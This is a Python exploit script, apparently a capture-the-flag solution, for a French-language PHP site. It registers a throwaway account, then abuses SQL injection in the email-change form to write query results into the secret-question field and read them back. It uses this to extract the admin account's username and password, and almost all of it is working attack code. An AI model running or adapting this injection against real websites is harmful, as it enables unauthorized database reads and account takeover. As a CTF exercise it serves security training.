import requests
import random
import string

HOST = "https://challenge.breizh.ctf:30000/"

def get_random_string(l):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(l))

def create_user(user):
    """ Create an account (user = pass) with given username. """
    s = requests.session()
    page = f"{HOST}index.php?page=register"
    data = {
        "name": user,
        "pass": user,
        "pass2": user,
        "pseudo": user,
        "mail": user,
        "secretquestion" : user,
        "secretanswer" : user,
        "ok": "S'%27i'nscrire+sur+Omega"
    }
    r = s.post(page, data=data)
    if "<b>Bravo</b>" in r.text:
        print(f"[+] Compte \"{user}\" créé.")

def login(user):
    s = requests.session()
    page = f"{HOST}index.php?page=home"
    data = {
        "login": user,
        "passlog": user,
        "hidden": "log",
        "logon": "Connexion+au+site"
    }
    r = s.post(page, data=data)
    return s

def query(user, qry):
    ## Connect with user
    s = login(user)

    ## Changemail SQLi (update), write data into question field
    payload = f"INJECTION', question = ({qry}), vipdate = '"
    page = f"{HOST}index.php?page=changemail"
    data = {
        "email": payload,
        "email2": payload,
        "reponse": user,
        "mdp": "Modifier"
    }
    r = s.post(page, data=data)
    if "Votre nouvelle email" in r.text:
        print("[+] Injection effectuée")
    ## Reconnect user to reload question
    s = login(user)
    page = f"{HOST}index.php?page=changemail"
    r = s.get(page).text
    question =r.split('Question Secrete :')[1].split('<td style="width:150px">')[1].split('</td>')[0]
    return question  # Query result

#
if __name__ == "__main__":
    user = get_random_string(12)
    create_user(user)
    username = query(user, "SELECT account FROM accounts WHERE guid=1")
    print(f"[+] Got username \"{username}\"")
    pwd = query(user, "SELECT pass FROM accounts WHERE guid=1")
    print(f"[+] Got password \"{pwd}\"")
    print(f"\n--- Connect as {username}:{pwd} and get the flag in /home/{username}")